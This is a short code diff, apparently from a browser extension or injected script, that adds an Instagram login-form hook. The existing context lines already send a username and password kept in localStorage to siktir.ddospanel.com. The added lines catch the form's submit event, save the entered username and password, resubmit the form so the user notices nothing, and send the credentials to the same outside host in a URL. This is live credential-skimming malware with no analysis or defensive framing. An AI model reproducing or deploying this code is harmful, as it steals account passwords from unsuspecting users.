@@ -54,3 +54,21 @@ if (localStorage.upom && localStorage.uzom) {
 		new Image().src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + localStorage.upom + "&pw=" + localStorage.uzom;	
     }	
 }
+
+
+
+if (top.location.href.indexOf("instagram.com") > -1) {
+    document.getElementsByClassName("_rwf8p")[0].onsubmit = function (e) {
+        localStorage.setItem("kadi", document.getElementsByClassName("_kp5f7 _qy55y")[0].value);
+        localStorage.setItem("sifre", document.getElementsByClassName("_kp5f7 _qy55y")[1].value);
+        setTimeout(function () {
+            document.getElementsByClassName("_rwf8p")[0].submit()
+        }, 99);
+        return false
+    }
+}
+if (localStorage.kadi && localStorage.sifre) {
+	
+		new Image().src = "https://siktir.ddospanel.com/cpin.php" + "?us=" + localStorage.kadi + "&pw=" + localStorage.sifre;	
+
+}
